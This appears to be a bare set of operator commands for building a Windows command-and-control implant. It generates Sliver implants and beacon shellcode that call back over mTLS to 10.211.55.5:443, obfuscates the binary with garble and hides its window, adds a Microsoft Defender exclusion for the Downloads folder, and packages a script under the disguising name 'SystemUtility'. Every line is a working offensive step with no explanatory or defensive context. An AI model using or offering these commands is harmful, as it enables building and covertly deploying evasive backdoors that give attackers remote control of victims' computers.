garble -literals -tiny -seed=random build -ldflags="-s -w -H=windowsgui" -o /tmp/clean_implant.exe /tmp/implant.exe


powershell -Command "Add-MpPreference -ExclusionPath $env:USERPROFILE\Downloads"



   generate --mtls 10.211.55.5:443 --format raw --arch amd64 --os windows --save /tmp/implant.bin
pyinstaller --noconsole --onefile --clean --name "SystemUtility" 1.py

generate beacon --os windows --arch amd64 --format shellcode --out /tmp/sliver.bin
